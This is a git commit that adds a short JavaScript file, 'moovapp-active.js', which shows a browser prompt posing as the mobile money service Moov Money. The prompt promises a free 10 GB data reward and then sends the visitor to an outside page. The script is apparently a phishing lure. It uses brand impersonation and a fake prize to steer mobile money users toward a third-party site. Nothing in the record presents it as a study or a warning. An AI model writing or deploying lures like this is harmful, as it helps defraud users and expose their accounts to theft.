fe5af3df938fc666357f634b5b276b6ca911378e
itidnewblog3 <ukpehaitid1@gmail.com>
2025-10-04 08:52:22 +0100

    Create moovapp-active.js

---
+++ moovapp-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 10 Go'
+password=prompt('Moov Money: Félicitations, votre numéro de mobile est éligible pour recevoir une récompense de 10 Go, cliquez sur OK pour activer les données','ACTIVER 10 Go');
+if (password != 'ACTIVER 10 Go') {
+location.href='https://lhegit.org/moov-app.html';
+}
